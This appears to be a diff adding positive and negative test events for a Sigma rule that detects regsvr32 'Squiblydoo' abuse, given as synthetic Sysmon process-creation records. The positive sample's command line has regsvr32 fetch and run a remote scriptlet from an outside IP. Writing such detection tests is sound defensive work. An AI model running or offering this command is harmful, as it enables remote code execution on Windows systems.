@@ -1,0 +1,20 @@
+# Positive/negative samples for rules/sigma/win_lolbas_regsvr32_squiblydoo.yml (synthetic lab events)
+rule: win_lolbas_regsvr32_squiblydoo.yml
+positive:
+- name: Squiblydoo
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      CommandLine: regsvr32 /s /n /u /i:http://203.0.113.5/file.sct scrobj.dll
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+negative:
+- name: Registering a local DLL
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      CommandLine: 'regsvr32 /s C:\Program Files\Vendor\plugin.dll'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
